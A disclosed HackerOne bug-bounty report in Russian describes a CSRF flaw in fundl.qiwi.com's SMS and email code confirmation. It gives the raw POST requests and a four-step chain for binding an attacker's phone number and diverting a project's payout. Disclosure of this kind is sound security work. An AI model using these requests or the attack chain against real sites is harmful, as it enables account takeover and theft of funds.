---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '301718'
original_report_id: '301718'
title: https://fundl.qiwi.com CSRF на подтверждении sms
team_handle: qiwi
created_at: '2018-01-02T02:48:33.760Z'
disclosed_at: '2018-03-11T21:40:55.435Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
---

# https://fundl.qiwi.com CSRF на подтверждении sms

## Metadata

- HackerOne Report ID: 301718
- Weakness: 
- Program: qiwi
- Disclosed At: 2018-03-11T21:40:55.435Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Доброго времени суток. Я тут нашел достаточно серьезную CSRF, как мне кажется. Она позволяет привязать номер телефона злоумышленника -> угнать деньги. И основана она отчасти на старой CSRF, которую я репортил совсем недавно (https://hackerone.com/reports/300676)

Так вот, тогда я не доглядел еще одну серьезную CSRF (а точнее даже две, но я объединил в одну).

Смотрите. На указанный в профиле номер, как я понимаю, приходит собранная с определенного проекта денежка. Номер сохраняется в профиле в 2 этапа.

1 этап - отправка смс сообщения с кодом (данную CSRF я уже репортил)
{F250801}
2 этап - ввод кода на сайте и окончательная привязка.
{F250802}

Так вот, на ввод кода разработчики забыли сделать токен. А я считаю что тут он обязательно нужен. Немного позже объясню почему.

Сам запрос выглядит так:
```
https://fundl.qiwi.com/user/qiwi/check/sms
```
```
POST /user/qiwi/check/sms HTTP/1.1
Host: fundl.qiwi.com
Connection: keep-alive
Content-Length: 79
Accept: */*
Origin: https://fundl.qiwi.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://fundl.qiwi.com/personal/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _ym_uid=1512756320171871561; _ga=GA1.2.405923632.1512250944; _ga_cid=405923632.1512250944; _gid=GA1.2.1944034652.1514664504; spa_upstream=f6a379788bf7d1c4070169996915c20a; _ym_isad=1; token-tail=833ac8aa4f98c622; _ym_visorc_45809457=w; PHPSESSID=cb4p3o9g12br9vee6lkm19nc73; _ga_info=106|6|1514859125338|r=https://fundl.qiwi.com/project/lavina|5a2580fc421d4b5e3384eba69a465ba911995493d9c3449dd33ee0042c638f72
```
```
code=тут код с телефона
```

Кроме этого, если к qiwi кошельку привязана почта, то нет токена на подтверждение email кода

{F250804}

И опять же, токена мы не наблюдаем!

Запрос уже немного другой:
```
https://fundl.qiwi.com/user/qiwi/check/email
```
```
POST /user/qiwi/check/email HTTP/1.1
Host: fundl.qiwi.com
Connection: keep-alive
Content-Length: 10
Accept: */*
Origin: https://fundl.qiwi.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://fundl.qiwi.com/personal/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _ym_uid=1512756320171871561; _ga=GA1.2.405923632.1512250944; _ga_cid=405923632.1512250944; _gid=GA1.2.1944034652.1514664504; spa_upstream=f6a379788bf7d1c4070169996915c20a; _ym_isad=1; token-tail=833ac8aa4f98c622; _ym_visorc_45809457=w; PHPSESSID=cb4p3o9g12br9vee6lkm19nc73; _ga_info=106|6|1514859125338|r=https://fundl.qiwi.com/project/lavina|5a2580fc421d4b5e3384eba69a465ba911995493d9c3449dd33ee0042c638f72
```
```
code=тут код с почты
```

## Impact

В итоге, что мы имеем?

Используя комбинацию уязвимостей мы можем угнать деньги с определенного проекта.

Итоговый POC такой:
1. Ищем жертву, желательно такой проект который собрал всю сумму и ожидает выплату;
2. Эксплуатируем CSRF на отправку смс на свой номер, узнаем код;
3. Эксплуатируем CSRF на подтверждение смс кода;
4. Ждем деньги;

p.s. эксплуатация в реальных условиях достаточно тяжела, но возможно.
подводный камень - потенциально привязаный эмайл.

Если он не привязан, то все окей) мы получаем в итоге такой ответ и радуемся жизни:
```
{"success":true,"need_email_code":false}
```

Если будут какие-то вопросы то с радостью отвечу. Дыра очевидная) Успехов. vk.com/lc

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
